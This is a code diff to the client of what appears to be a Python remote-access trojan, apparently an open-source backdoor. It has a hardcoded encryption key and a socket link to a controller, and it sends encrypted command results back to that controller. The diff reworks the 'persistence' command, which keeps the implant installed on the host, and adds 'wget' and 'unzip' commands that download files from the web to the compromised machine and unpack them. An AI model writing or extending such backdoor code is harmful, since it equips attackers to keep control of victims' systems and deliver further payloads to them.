@@ -15,11 +15,12 @@ from core import common
 from core import crypto
 from core import filesock
 from core import persistence
+from core import toolkit
 
-
-HOST    = 'localhost'
-PORT    = 1338
-FB_KEY  = '82e672ae054aa4de6f042c888111686a'
+PLATFORM = sys.platform
+HOST     = 'localhost'
+PORT     = 1338
+FB_KEY   = '82e672ae054aa4de6f042c888111686a'
 # generate your own key with...
 # python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
 
@@ -71,11 +72,17 @@ def main():
 
         # apply persistence mechanism
         elif cmd == 'persistence':
-            success, details = persistence.run()
-            if success:
-                results = 'Persistence successful, {}.'.format(details)
-            else:
-                results = 'Persistence unsuccessful, {}.'.format(details)
+            results = persistence.run(PLATFORM)
+            s.send(crypto.AES_encrypt(results, DHKEY))
+
+        # download a file from the web
+        elif cmd == 'wget':
+            results = toolkit.wget(action)
+            s.send(crypto.AES_encrypt(results, DHKEY))
+
+        # unzip a file
+        elif cmd == 'unzip':
+            results = toolkit.unzip(action)
             s.send(crypto.AES_encrypt(results, DHKEY))
 
 
